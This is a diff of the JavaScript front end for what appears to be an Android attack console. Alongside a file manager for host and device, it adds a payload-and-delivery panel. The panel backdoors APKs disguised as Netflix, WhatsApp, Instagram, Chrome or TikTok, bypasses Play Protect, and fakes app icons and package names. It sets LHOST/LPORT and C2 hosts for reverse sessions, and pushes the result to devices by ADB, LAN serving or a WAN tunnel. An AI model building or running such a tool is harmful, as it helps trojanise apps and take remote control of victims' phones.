-      const sz = f.size > 1048576 ? (f.size/1048576).toFixed(1)+'MB' :
-                 f.size > 1024    ? (f.size/1024).toFixed(1)+'KB' : f.size+'B';
-      const ts = new Date(f.mtime*1000).toLocaleString();
-      row.innerHTML = `<span class="fn" title="${f.full}">${f.path}</span>
-        <span class="fsz">${sz}</span>
-        <span class="fts">${ts}</span>
-        <button class="copy-btn" onclick="navigator.clipboard.writeText('${f.full.replace(/'/g,"\\'")}')">copy</button>`;
-      panel.appendChild(row);
+  if (!fmHostPath) fmHostPath = document.getElementById('fm-host-path-inp')?.value || '';
+  fmHostNav(fmHostPath || null);
+  fmDevNav(fmDevPath);
+}
+
+function _fmFmt(size) {
+  if (size > 1048576) return (size/1048576).toFixed(1)+'MB';
+  if (size > 1024)    return (size/1024).toFixed(1)+'KB';
+  return size+'B';
+}
+
+function _fmIco(entry) {
+  if (entry.type === 'dir') return '📁';
+  const e = (entry.ext||entry.name||'').toLowerCase();
+  if (e.endsWith('.apk')||e.endsWith('.aab')) return '📦';
+  if (e.endsWith('.txt')||e.endsWith('.log')) return '📄';
+  if (e.endsWith('.json')||e.endsWith('.yml')||e.endsWith('.yaml')) return '🗒';
+  if (e.endsWith('.py')||e.endsWith('.js')||e.endsWith('.smali')) return '📝';
+  if (e.endsWith('.png')||e.endsWith('.jpg')||e.endsWith('.jpeg')) return '🖼';
+  if (e.endsWith('.zip')||e.endsWith('.tar')||e.endsWith('.gz'))   return '🗜';
+  return '📄';
+}
+
+function _fmEntryClass(entry) {
+  if (entry.type === 'dir') return 'fm-entry fm-dir';
+  const e = (entry.ext||entry.name||'').toLowerCase();
+  if (e.endsWith('.apk')||e.endsWith('.aab')) return 'fm-entry fm-file fm-apk';
+  return 'fm-entry fm-file';
+}
+
+function fmBreadcrumb(path, clickFn) {
+  const parts = path.replace(/\/+/g,'/').split('/').filter(Boolean);
+  let html = `<span class="fm-bc-seg" onclick="${clickFn}('/')">/ root</span>`;
+  let acc = '';
+  for (const p of parts) {
+    acc += '/' + p;
+    const _acc = acc;
+    html += `<span class="fm-bc-sep"> › </span><span class="fm-bc-seg" onclick="${clickFn}('${_acc.replace(/'/g,"\\'")}');return false;">${esc(p)}</span>`;
+  }
+  return html;
+}
+
+function fmHostNav(path) {
+  const list   = document.getElementById('fm-host-list');
+  const status = document.getElementById('fm-host-status');
+  const bc     = document.getElementById('fm-host-bc');
+  const inp    = document.getElementById('fm-host-path-inp');
+  if (!path) path = (inp&&inp.value) || (window._fmHomePath||'/root');
+  list.innerHTML = '<div class="fm-empty">Loading…</div>';
+  fetch(`/api/fs/list?path=${encodeURIComponent(path)}`)
+    .then(r => r.json()).then(d => {
+      if (d.error) { list.innerHTML = `<div class="fm-empty" style="color:var(--red)">${esc(d.error)}</div>`; return; }
+      fmHostPath = d.path;
+      if (inp) inp.value = d.path;
+      if (bc) bc.innerHTML = fmBreadcrumb(d.path, 'fmHostNav');
+      if (d.parent) {
+        bc.innerHTML = `<span class="fm-bc-seg" onclick="fmHostNav('${d.parent.replace(/'/g,"\\'")}')">.. parent</span> ` + bc.innerHTML;
+      }
+      list.innerHTML = '';
+      const entries = d.entries || [];
+      document.getElementById('fm-host-count').textContent = entries.length + ' items';
+      if (!entries.length) { list.innerHTML = '<div class="fm-empty">Empty directory</div>'; return; }
+      for (const e of entries) {
+        const row = document.createElement('div');
+        row.className  = _fmEntryClass(e);
+        row.title      = e.path;
+        const isApk    = (e.ext||'').toLowerCase() === '.apk' || (e.ext||'').toLowerCase() === '.aab';
+        row.innerHTML  = `<span class="fm-ico">${_fmIco(e)}</span>
+          <span class="fm-name">${esc(e.name)}${isApk?' <span class="fm-apk-badge">APK</span>':''}</span>
+          <span class="fm-size">${e.type==='file'?_fmFmt(e.size):''}</span>`;
+        row.addEventListener('click', () => fmHostSelect(e, row));
+        row.addEventListener('dblclick', () => {
+          if (e.type === 'dir') fmHostNav(e.path);
+          else fmPreview(e, 'host');
+        });
+        row.addEventListener('contextmenu', ev => { ev.preventDefault(); fmCtxMenu(ev, e, 'host'); });
+        list.appendChild(row);
+      }
+      status && (status.textContent = d.path);
+    }).catch(err => { list.innerHTML = `<div class="fm-empty" style="color:var(--red)">${err}</div>`; });
+}
+
+function fmDevNav(path) {
+  const serial = document.querySelector('#dev-select')?.value || '';
+  const list   = document.getElementById('fm-dev-list');
+  const status = document.getElementById('fm-dev-status');
+  const bc     = document.getElementById('fm-dev-bc');
+  if (!path) path = fmDevPath;
+  list.innerHTML = '<div class="fm-empty">Loading…</div>';
+  fetch(`/api/device/fs/list?serial=${encodeURIComponent(serial)}&path=${encodeURIComponent(path)}`)
+    .then(r => r.json()).then(d => {
+      if (d.error && !d.entries?.length) {
+        list.innerHTML = `<div class="fm-empty" style="color:var(--red);">${esc(d.error||'No device')}</div>`; return;
+      }
+      fmDevPath = d.path;
+      if (bc) bc.innerHTML = fmBreadcrumb(d.path, 'fmDevNav');
+      if (d.parent) {
+        bc.innerHTML = `<span class="fm-bc-seg" onclick="fmDevNav('${d.parent.replace(/'/g,"\\'")}')">.. parent</span> ` + bc.innerHTML;
+      }
+      list.innerHTML = '';
+      const entries = d.entries || [];
+      document.getElementById('fm-dev-count').textContent = entries.length + ' items';
+      if (!entries.length) { list.innerHTML = '<div class="fm-empty">Empty or permission denied</div>'; return; }
+      for (const e of entries) {
+        const row = document.createElement('div');
+        row.className = _fmEntryClass(e);
+        row.title     = e.path;
+        row.innerHTML = `<span class="fm-ico">${_fmIco(e)}</span>
+          <span class="fm-name">${esc(e.name)}</span>
+          <span class="fm-perms">${e.perms||''}</span>
+          <span class="fm-size">${e.type==='file'?e.size:''}</span>`;
+        row.addEventListener('click', () => fmDevSelect(e, row));
+        row.addEventListener('dblclick', () => { if (e.type === 'dir') fmDevNav(e.path); });
+        row.addEventListener('contextmenu', ev => { ev.preventDefault(); fmCtxMenu(ev, e, 'device'); });
+        list.appendChild(row);
+      }
+      status && (status.textContent = d.path);
+    }).catch(err => { list.innerHTML = `<div class="fm-empty" style="color:var(--red)">${err}</div>`; });
+}
+
+function fmHostSelect(entry, row) {
+  document.querySelectorAll('#fm-host-list .fm-entry').forEach(r => r.classList.remove('selected'));
+  row.classList.add('selected');
+  fmHostSel = entry;
+  fmPreview(entry, 'host');
+}
+
+function fmDevSelect(entry, row) {
+  document.querySelectorAll('#fm-dev-list .fm-entry').forEach(r => r.classList.remove('selected'));
+  row.classList.add('selected');
+  fmDevSel = entry;
+  fmPreview(entry, 'device');
+}
+
+function fmPreview(entry, side) {
+  const hdr  = document.getElementById('fm-preview-hdr');
+  const body = document.getElementById('fm-preview-content');
+  const isApk = (entry.ext||entry.name||'').toLowerCase().endsWith('.apk') ||
+                (entry.ext||entry.name||'').toLowerCase().endsWith('.aab');
+  if (hdr) hdr.textContent = entry.name;
+  let html = `<div class="fm-prev-meta">${entry.path}<br>`;
+  if (entry.size) html += `Size: ${_fmFmt(parseInt(entry.size)||0)} · `;
+  html += `Type: ${entry.type}</div>`;
+
+  if (entry.type === 'dir') {
+    html += `<div style="color:var(--muted);font-size:0.65rem;">Double-click to navigate</div>`;
+    html += `<div class="fm-prev-actions">`;
+    if (side === 'device') html += `<button class="fm-tb-btn" onclick="fmPullDir()">⬇ pull dir</button>`;
+    if (side === 'host')   html += `<button class="fm-tb-btn" onclick="fmPushToDevice()">⬆ push to device</button>`;
+    html += `</div>`;
+  } else if (isApk) {
+    html += `<div class="fm-prev-actions">`;
+    if (side === 'host') {
+      html += `<button class="fm-tb-btn go" onclick="fmUseApk('${entry.path.replace(/'/g,"\\'")}')">▶ use in ops</button>`;
+      html += `<button class="fm-tb-btn" onclick="fmDecompile('${entry.path.replace(/'/g,"\\'")}')">⊕ decompile</button>`;
+      html += `<button class="fm-tb-btn" onclick="fmDownload('${entry.path.replace(/'/g,"\\'")}')">⬇ download</button>`;
     }
-    if (!(d.files||[]).length)
-      panel.innerHTML += '<div style="padding:12px;color:var(--muted);font-size:0.68rem;">No work files yet. Run an operation first.</div>';
+    if (side === 'device') {
+      html += `<button class="fm-tb-btn go" onclick="fmPullApk()">⬇ pull APK</button>`;
+      html += `<button class="fm-tb-btn" onclick="fmPushToDevice()">⬆ push APK</button>`;
+    }
+    html += `</div>`;
+  } else if (side === 'host' && entry.type === 'file') {
+    fetch(`/api/fs/read?path=${encodeURIComponent(entry.path)}`)
+      .then(r => r.json()).then(d => {
+        let content = '';
+        if (d.binary) {
+          content = `<div style="color:var(--muted);font-size:0.62rem;">Binary file (${_fmFmt(d.size)})</div>`;
+        } else if (d.text) {
+          const preview = esc(d.text.slice(0, 3000));
+          content = `<pre class="fm-prev-text">${preview}${d.text.length>3000?'\n…(truncated)':''}</pre>`;
+        } else if (d.error) {
+          content = `<div style="color:var(--muted)">${esc(d.error)}</div>`;
+        }
+        const el = document.getElementById('fm-preview-content');
+        if (el) el.innerHTML += content + `<div class="fm-prev-actions">
+          <button class="fm-tb-btn" onclick="fmDownload('${entry.path.replace(/'/g,"\\'")}')">⬇ download</button>
+          <button class="fm-tb-btn" onclick="navigator.clipboard.writeText('${entry.path.replace(/'/g,"\\'")}')">copy path</button>
+          <button class="fm-tb-btn danger" onclick="fmDelete('${entry.path.replace(/'/g,"\\'")}','host')">✕ delete</button>
+        </div>`;
+      });
+  } else if (side === 'device' && entry.type === 'file') {
+    html += `<div class="fm-prev-actions">
+      <button class="fm-tb-btn go" onclick="fmPullFile()">⬇ pull to host</button>
+      <button class="fm-tb-btn" onclick="fmPushToDevice()">⬆ push file</button>
+    </div>`;
+  }
+  if (body) body.innerHTML = html;
+}
+
+function fmCtxMenu(ev, entry, side) {
+  const ctx = document.getElementById('fm-ctx');
+  ctx.style.display = 'block';
+  ctx.style.left    = ev.pageX + 'px';
+  ctx.style.top     = ev.pageY + 'px';
+  const isApk = (entry.ext||entry.name||'').toLowerCase().endsWith('.apk');
+  let items = [];
+  if (side === 'host') {
+    items.push(['copy path', () => navigator.clipboard.writeText(entry.path)]);
+    if (entry.type === 'file') {
+      items.push(['download', () => fmDownload(entry.path)]);
+      if (isApk) {
+        items.push(['use in ops', () => fmUseApk(entry.path)]);
+        items.push(['decompile APK', () => fmDecompile(entry.path)]);
+      }
+      items.push(null);
+      items.push(['delete', () => fmDelete(entry.path, 'host'), true]);
+    } else {
+      items.push(['rename', () => fmRename(entry.path, 'host')]);
+      items.push(null);
+      items.push(['delete dir', () => fmDelete(entry.path, 'host'), true]);
+    }
+  } else {
+    items.push(['pull to host', () => fmPullFileEntry(entry)]);
+    if (isApk) items.push(['pull APK + decompile', () => fmPullAndDecompile(entry)]);
+    items.push(['push file here', () => fmPushToPath(entry.path)]);
+    items.push(['copy path', () => navigator.clipboard.writeText(entry.path)]);
+  }
+  ctx.innerHTML = '';
+  const callbacks = [];
+  for (const i of items) {
+    if (i === null) { const sep = document.createElement('div'); sep.className='fm-ctx-sep'; ctx.appendChild(sep); continue; }
+    const el = document.createElement('div');
+    el.className = 'fm-ctx-item' + (i[2]?' danger':'');
+    el.textContent = i[0];
+    const fn = i[1];
+    el.addEventListener('click', () => { ctx.style.display='none'; fn(); });
+    ctx.appendChild(el);
+  }
+  const clickOut = e => { if (!ctx.contains(e.target)) { ctx.style.display='none'; document.removeEventListener('click', clickOut); } };
+  setTimeout(() => document.addEventListener('click', clickOut), 50);
+}
+
+function fmDownload(path) {
+  const a = document.createElement('a');
+  a.href = '/api/fs/download?path=' + encodeURIComponent(path);
+  a.download = path.split('/').pop();
+  a.click();
+}
+
+function fmUseApk(path) {
+  const apkInp = document.querySelector('.param-field[data-name="apk_path"]');
+  if (apkInp) {
+    apkInp.value = path;
+    termLine(`\x1b[32m[fm] APK path set: ${path}\x1b[0m`);
+    switchTab('terminal');
+  } else {
+    navigator.clipboard.writeText(path);
+    termLine(`\x1b[33m[fm] No apk_path field visible — path copied to clipboard: ${path}\x1b[0m`);
+  }
+}
+
+function fmDecompile(path) {
+  termLine(`\x1b[36m[fm] Decompiling ${path}…\x1b[0m`);
+  switchTab('terminal');
+  fetch('/api/apk/decompile', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({apk: path})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      termLine(`\x1b[32m[fm] Decompiled → ${d.out_dir}\x1b[0m`);
+      fmHostNav(d.out_dir);
+    } else {
+      termLine(`\x1b[31m[fm] Decompile failed: ${d.error||d.stderr}\x1b[0m`);
+    }
   });
 }
+
+function fmRecompile(srcDir) {
+  termLine(`\x1b[36m[fm] Recompiling ${srcDir}…\x1b[0m`);
+  switchTab('terminal');
+  fetch('/api/apk/recompile', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({src: srcDir, sign: true})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      termLine(`\x1b[32m[fm] Recompiled + signed → ${d.out_apk}\x1b[0m`);
+      fmHostNav(d.out_apk.substring(0, d.out_apk.lastIndexOf('/')));
+    } else {
+      termLine(`\x1b[31m[fm] Recompile failed: ${d.error||d.stderr}\x1b[0m`);
+    }
+  });
+}
+
+function fmDelete(path, side) {
+  if (!confirm(`Delete ${path}?`)) return;
+  fetch('/api/fs/delete', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({path})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) { termLine(`\x1b[32m[fm] Deleted ${path}\x1b[0m`); fmHostNav(fmHostPath); }
+    else      termLine(`\x1b[31m[fm] Delete failed: ${d.error}\x1b[0m`);
+  });
+}
+
+function fmRename(path, side) {
+  const newname = prompt('New name/path:', path);
+  if (!newname || newname === path) return;
+  fetch('/api/fs/rename', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({src: path, dst: newname})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) { termLine(`\x1b[32m[fm] Renamed → ${d.path}\x1b[0m`); fmHostNav(fmHostPath); }
+    else      termLine(`\x1b[31m[fm] Rename failed: ${d.error}\x1b[0m`);
+  });
+}
+
+function fmMkdir(side) {
+  const base = side === 'host' ? fmHostPath : fmDevPath;
+  const name = prompt('New folder name:', 'new_folder');
+  if (!name) return;
+  const full = base.replace(/\/+$/,'') + '/' + name;
+  fetch('/api/fs/mkdir', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({path: full})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) { fmHostNav(fmHostPath); }
+    else      termLine(`\x1b[31m[fm] mkdir failed: ${d.error}\x1b[0m`);
+  });
+}
+
+function fmUploadClick() {
+  document.getElementById('fm-upload-inp')?.click();
+}
+
+function fmUploadFile(inp) {
+  const file = inp.files[0];
+  if (!file) return;
+  termLine(`\x1b[36m[fm] Uploading ${file.name} (${_fmFmt(file.size)})…\x1b[0m`);
+  const reader = new FileReader();
+  reader.onload = e => {
+    const buf = e.target.result;
+    fetch('/api/fs/upload', {
+      method:'POST',
+      headers:{'Content-Length': buf.byteLength, 'X-Filename': file.name, 'X-Dest-Dir': fmHostPath},
+      body: buf
+    }).then(r => r.json()).then(d => {
+      if (d.ok) {
+        termLine(`\x1b[32m[fm] Uploaded → ${d.path}\x1b[0m`);
+        fmHostNav(fmHostPath);
+      } else termLine(`\x1b[31m[fm] Upload failed: ${d.error}\x1b[0m`);
+    });
+  };
+  reader.readAsArrayBuffer(file);
+  inp.value = '';
+}
+
+function fmPullApkDialog() {
+  const serial  = document.querySelector('#dev-select')?.value || '';
+  const package_ = prompt('Package name to pull (e.g. com.example.app):');
+  if (!package_) return;
+  termLine(`\x1b[36m[fm] Pulling APK for ${package_}…\x1b[0m`);
+  fetch('/api/device/apk/pull', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({serial, package: package_})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      termLine(`\x1b[32m[fm] APK pulled → ${d.local}\x1b[0m`);
+      fmHostNav(d.local.substring(0, d.local.lastIndexOf('/')));
+    } else termLine(`\x1b[31m[fm] Pull failed: ${d.error||d.output}\x1b[0m`);
+  });
+}
+
+function fmPullFileEntry(entry) {
+  const serial = document.querySelector('#dev-select')?.value || '';
+  termLine(`\x1b[36m[fm] Pulling ${entry.path}…\x1b[0m`);
+  fetch('/api/device/fs/pull', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({serial, remote: entry.path})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      termLine(`\x1b[32m[fm] Pulled → ${d.local}\x1b[0m`);
+      fmHostNav(d.local.substring(0, d.local.lastIndexOf('/')));
+    } else termLine(`\x1b[31m[fm] Pull failed: ${d.output}\x1b[0m`);
+  });
+}
+
+function fmPullFile() { if (fmDevSel) fmPullFileEntry(fmDevSel); }
+function fmPullApk()  { if (fmDevSel) fmPullFileEntry(fmDevSel); }
+function fmPullDir()  { if (fmDevSel) fmPullFileEntry(fmDevSel); }
+
+function fmPushToDevice() {
+  if (!fmHostSel) { alert('Select a file on the host first'); return; }
+  const serial = document.querySelector('#dev-select')?.value || '';
+  const remote = fmDevPath.replace(/\/+$/,'') + '/' + fmHostSel.name;
+  if (!confirm(`Push ${fmHostSel.path} → device:${remote}?`)) return;
+  termLine(`\x1b[36m[fm] Pushing ${fmHostSel.path} → device:${remote}…\x1b[0m`);
+  fetch('/api/device/fs/push', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({serial, local: fmHostSel.path, remote})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) termLine(`\x1b[32m[fm] Pushed OK\x1b[0m`);
+    else      termLine(`\x1b[31m[fm] Push failed: ${d.output}\x1b[0m`);
+    fmDevNav(fmDevPath);
+  });
+}
+
+function fmPushToPath(remotePath) {
+  if (!fmHostSel) { alert('Select a host file first'); return; }
+  const serial = document.querySelector('#dev-select')?.value || '';
+  termLine(`\x1b[36m[fm] Pushing ${fmHostSel.path} → device:${remotePath}…\x1b[0m`);
+  fetch('/api/device/fs/push', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({serial, local: fmHostSel.path, remote: remotePath})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) termLine(`\x1b[32m[fm] Pushed OK\x1b[0m`);
+    else      termLine(`\x1b[31m[fm] Push failed: ${d.output}\x1b[0m`);
+    fmDevNav(fmDevPath);
+  });
+}
+
+function fmPullAndDecompile(entry) {
+  const serial = document.querySelector('#dev-select')?.value || '';
+  termLine(`\x1b[36m[fm] Pulling + decompiling ${entry.path}…\x1b[0m`);
+  fetch('/api/device/fs/pull', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({serial, remote: entry.path})
+  }).then(r => r.json()).then(d => {
+    if (!d.ok) { termLine(`\x1b[31m[fm] Pull failed: ${d.output}\x1b[0m`); return; }
+    termLine(`\x1b[32m[fm] Pulled → ${d.local}\x1b[0m`);
+    fmDecompile(d.local);
+  });
+}
+
+// init host path from server home dir
+fetch('/api/workdir').then(r => r.json()).then(d => {
+  if (d.base) {
+    window._fmHomePath = d.base;
+    const inp = document.getElementById('fm-host-path-inp');
+    if (inp && !inp.value) inp.value = d.base;
+  }
+});
 
 // ── Setup/Deps ────────────────────────────────────────────────────────────────
 function loadSettings() {
@@ -2435,6 +4925,11 @@ function loadSettings() {
     document.getElementById('s-nvd').value     = settings.nvd_api_key||'';
     document.getElementById('s-c2host').value  = settings.c2_host||'';
     document.getElementById('s-c2port').value  = settings.c2_port||'8889';
+    // sync into P&D fields
+    const lhEl = document.getElementById('pd-lhost');
+    const lpEl = document.getElementById('pd-lport');
+    if (lhEl && settings.lhost) lhEl.value = settings.lhost;
+    if (lpEl && settings.lport) lpEl.value = settings.lport;
   });
 }
 
@@ -2470,39 +4965,999 @@ function updateLhostDisplay() {
 }
 
 function loadDeps() {
-  const grid = document.getElementById('dep-grid');
-  grid.innerHTML = '<div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;">Checking...</div>';
+  const grid  = document.getElementById('dep-grid');
+  const badge = document.getElementById('dep-pkgmgr');
+  grid.innerHTML = '<div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;letter-spacing:0.08em;">scanning…</div>';
   fetch('/api/deps').then(r => r.json()).then(d => {
+    if (badge && d.pkg_mgr) {
+      badge.textContent = d.pkg_mgr;
+      badge.style.display = 'inline';
+    }
     grid.innerHTML = '';
-    for (const [name, info] of Object.entries(d.deps||{})) {
-      const card = document.createElement('div'); card.className = 'dep-card';
-      card.innerHTML = `<div class="dep-dot ${info.ok?'ok':'miss'}"></div>
-        <div style="flex:1">
-          <div class="dep-name">${name} ${info.ok?'<span style="color:var(--green);font-size:0.6rem;">✓</span>':'<span style="color:var(--red);font-size:0.6rem;">✗</span>'}</div>
-          ${!info.ok?`<div class="dep-install">${info.install}</div>`:''}
-        </div>`;
-      grid.appendChild(card);
+    const missing = [], present = [];
+    for (const [name, info] of Object.entries(d.deps || {})) {
+      (info.ok ? present : missing).push([name, info]);
+    }
+    const render = (list) => {
+      for (const [name, info] of list) {
+        const card = document.createElement('div'); card.className = 'dep-card';
+        card.innerHTML = `
+          <div class="dep-dot ${info.ok?'ok':'miss'}"></div>
+          <div style="flex:1;overflow:hidden;">
+            <div class="dep-name">${name}</div>
+            ${!info.ok ? `<div class="dep-install" title="${info.install}">${info.install}</div>` : ''}
+          </div>
+          <span style="font-size:0.62rem;${info.ok?'color:var(--green)':'color:var(--red)'}">${info.ok?'✓':'✗'}</span>`;
+        grid.appendChild(card);
+      }
+    };
+    render(missing);
+    if (missing.length && present.length) {
+      const sep = document.createElement('div');
+      sep.style.cssText = 'grid-column:1/-1;background:var(--border2);height:1px;margin:2px 0;';
+      grid.appendChild(sep);
+    }
+    render(present);
+    if (!missing.length) {
+      const ok = document.createElement('div');
+      ok.style.cssText = 'grid-column:1/-1;padding:8px 14px;font-size:0.65rem;color:var(--green);letter-spacing:0.06em;';
+      ok.textContent = '✓ all dependencies satisfied';
+      grid.prepend(ok);
     }
   });
 }
 
+// ════════════════════════════════════════════════════════════════════════════
+// PAYLOAD & DELIVERY PANEL
+// ════════════════════════════════════════════════════════════════════════════
+let _pdSrcMode = 'local';      // 'local' | 'template' | 'device' | 'standalone'
+let _pdMthSel  = 'none';       // 'none' | 'adb' | 'lan' | 'wan'
+let _pdBuiltApk = '';          // path of last built/selected APK
+let _pdWanActive = false;
+let _pdLanActive = false;
+
+// ── pdFormUpd: sync radio state → conditionals + button label ────────────────
+const _PM_TEMPLATES = {
+  netflix:'~/.secv/templates/netflix.apk', whatsapp:'~/.secv/templates/whatsapp.apk',
+  instagram:'~/.secv/templates/instagram.apk', chrome:'~/.secv/templates/chrome.apk',
+  tiktok:'~/.secv/templates/tiktok.apk'
+};
+
+function pdFormUpd() {
+  const srcEl = document.querySelector('input[name="pd-src"]:checked');
+  const src   = srcEl ? srcEl.value : 'local';
+  // update chip highlights
+  document.querySelectorAll('#pm-src-chips .pm-chip').forEach(c =>
+    c.classList.toggle('sel', c.querySelector('input').value === src));
+  // set internal mode
+  _pdSrcMode = _PM_TEMPLATES[src] ? 'template' : src;
+  // auto-fill path for templates
+  if (_PM_TEMPLATES[src]) {
+    const apk = document.getElementById('pd-apk-path');
+    if (apk) { apk.value = _PM_TEMPLATES[src]; pdCheckApkStatus(); }
+  }
+  // source sub-sections
+  const isPath = src === 'local' || !!_PM_TEMPLATES[src];
+  const pathSub = document.getElementById('pm-sub-path');
+  const devSub  = document.getElementById('pm-sub-device');
+  const stSub   = document.getElementById('pm-sub-standalone');
+  if (pathSub) pathSub.classList.toggle('show', isPath);
+  if (devSub)  devSub.classList.toggle('show',  src === 'device');
+  if (stSub)   stSub.classList.toggle('show',   src === 'standalone');
+
+  const dlvEl = document.querySelector('input[name="pd-dlv"]:checked');
+  const dlv   = dlvEl ? dlvEl.value : 'none';
+  _pdMthSel   = dlv;
+  // update delivery chip highlights
+  document.querySelectorAll('#pm-dlv-chips .pm-chip').forEach(c =>
+    c.classList.toggle('sel', c.querySelector('input').value === dlv));
+  // delivery sub-sections
+  ['adb-net','lan','wan'].forEach(m => {
+    const el = document.getElementById('pm-sub-' + m);
+    if (el) el.classList.toggle('show', m === dlv);
+  });
+
+  // update button label
+  const btn = document.getElementById('pd-action-btn');
+  if (!btn) return;
+  const isStand = _pdSrcMode === 'standalone';
+  const lblMap = {
+    'none':    isStand ? '▶ GENERATE PAYLOAD'                  : '▶ BUILD &amp; INJECT',
+    'adb-usb': isStand ? '▶ GENERATE &amp; INSTALL (USB)'      : '▶ BUILD, INJECT &amp; INSTALL (USB)',
+    'adb-net': isStand ? '▶ GENERATE &amp; INSTALL (WIRELESS)' : '▶ BUILD, INJECT &amp; INSTALL (WIRELESS)',
+    'lan':     isStand ? '▶ GENERATE &amp; SERVE LAN'          : '▶ BUILD, INJECT &amp; SERVE LAN',
+    'wan':     isStand ? '▶ GENERATE &amp; EXPOSE WAN'         : '▶ BUILD, INJECT &amp; EXPOSE WAN',
+  };
+  btn.innerHTML = lblMap[dlv] || lblMap['none'];
+}
+
+function pdTplChange() { pdFormUpd(); }
+
+// ── pdAction: unified build + optional delivery ───────────────────────────────
+function pdAction() {
+  const srcEl = document.querySelector('input[name="pd-src"]:checked');
+  const src   = srcEl ? srcEl.value : 'local';
+  const dlvEl = document.querySelector('input[name="pd-dlv"]:checked');
+  const dlv   = dlvEl ? dlvEl.value : 'none';
+  _pdSrcMode  = _PM_TEMPLATES[src] ? 'template' : src;
+  _pdMthSel   = dlv;
+
+  const lhost   = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
+  const lport   = document.getElementById('pd-lport').value.trim() || '4444';
+  const payload = document.getElementById('pd-payload').value;
+  const togPP   = document.getElementById('pd-tog-pp').checked;
+  const togID   = document.getElementById('pd-tog-id').checked;
+  const logEl   = document.getElementById('pd-build-log');
+
+  if (!lhost) { showToast('Set LHOST first', 'disconnect', 3000); return; }
+
+  logEl.style.display = 'block';
+  logEl.textContent   = '';
+  const pdLog = txt => { logEl.textContent += txt + '\n'; logEl.scrollTop = logEl.scrollHeight; };
+
+  let params = { lhost, lport, payload };
+  let ops    = [];
+
+  if (src === 'standalone') {
+    ops.push({ op:'backdoor_apk', params: { ...params, standalone: true, apk_path: '',
+      output_name: document.getElementById('pd-standalone-name').value || 'payload.apk' }});
+  } else {
+    const apkPath = document.getElementById('pd-apk-path').value.trim();
+    if (!apkPath) { showToast('Select an APK source or fill in a path', 'disconnect', 2500); return; }
+    params.apk_path = apkPath;
+    ops.push({ op:'backdoor_apk', params });
+  }
+
+  if (togPP) ops.push({ op:'bypass_play_protect', params });
+  if (togID) ops.push({ op:'customize_apk', params: { ...params,
+    icon_path:    document.getElementById('pd-icon').value.trim(),
+    app_label:    document.getElementById('pd-app-label').value.trim(),
+    package_name: document.getElementById('pd-pkg-name').value.trim(),
+  }});
+
+  pdLog('Starting: ' + ops.map(o => o.op).join(' → ') + (dlv !== 'none' ? ' → ' + dlv : '') + '\n');
+
+  function runNext(idx) {
+    if (idx >= ops.length) {
+      pdLog('\n✓ Build complete.');
+      pdCheckApkStatus();
+      if (dlv === 'none')    { showToast('Build done', 'connect', 3000); return; }
+      if (dlv === 'adb-usb') { pdLog('\n→ ADB install (USB)…');       pdAdbInstall();    return; }
+      if (dlv === 'adb-net') {
+        if (!document.getElementById('pd-adb-ip').value.trim()) {
+          showToast('Enter device IP in Delivery section', 'disconnect', 2500); return;
+        }
+        pdLog('\n→ ADB install (network)…'); pdAdbNetInstall(); return;
+      }
+      if (dlv === 'lan')  { pdLog('\n→ Starting LAN server…'); pdRunOp('lan_serve'); return; }
+      if (dlv === 'wan')  { pdLog('\n→ Starting WAN tunnel…'); pdWanExpose();        return; }
+      return;
+    }
+    const { op, params: p } = ops[idx];
+    const serial = document.getElementById('dev-select').value;
+    pdLog('→ Running: ' + op);
+    fetch('/api/run', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ target: serial, params: { operation: op, ...p }})
+    }).then(r => r.json()).then(d => {
+      if (d.session_id) {
+        if (src === 'standalone' && idx === 0) {
+          _pdBuiltApk = '/tmp/' + (document.getElementById('pd-standalone-name').value || 'payload.apk');
+          document.getElementById('pd-apk-path').value = _pdBuiltApk;
+        }
+        pdLog('  Session #' + d.session_id + ' started');
+        watchSession(d.session_id, () => runNext(idx + 1), pdLog);
+      } else {
+        pdLog('  Error: ' + (d.error||JSON.stringify(d)));
+      }
+    }).catch(e => pdLog('  Fetch error: ' + e));
+  }
+  runNext(0);
+}
+
+// ── pdNav: unified panel — scroll to section, refresh if needed ──────────────
+function pdNav(view) {
+  // unified layout — all sections are always visible, just scroll to them
+  const anchor = view === 'sessions' ? 'pdv-secv-list'
+               : view === 'deliver'  ? 'pd-apk-status-card'
+               : view === 'qr'       ? 'pdv-qr-area'
+               : 'pd-action-btn';
+  const el = document.getElementById(anchor);
+  if (el) el.scrollIntoView({behavior:'smooth', block:'start'});
+  if (view === 'sessions') { pdRefreshSessions(); pdRefreshMsfSessions(); }
+  if (view === 'deliver')  { pdCheckApkStatus(); }
+  if (view === 'qr')       { pdRefreshQRView(); }
+}
+
+// ── source selector ───────────────────────────────────────────────────────────
+function pdSrc(mode) {
+  _pdSrcMode = mode;
+  document.querySelectorAll('.pd-src-tab').forEach(b => b.classList.toggle('active', b.textContent.toLowerCase().includes(mode === 'standalone' ? 'poison' : mode)));
+  ['local','device','standalone'].forEach(m => {
+    const el = document.getElementById('pd-src-' + m);
+    if (el) { el.classList.toggle('show', m === mode); }
+  });
+}
+
+// ── auto-fill APK path — scan android/ then templates/ ───────────────────────
+function pdAutoFillApk() {
+  const dirs = ['~/.secv/android', '~/.secv/templates'];
+  let allApks = [];
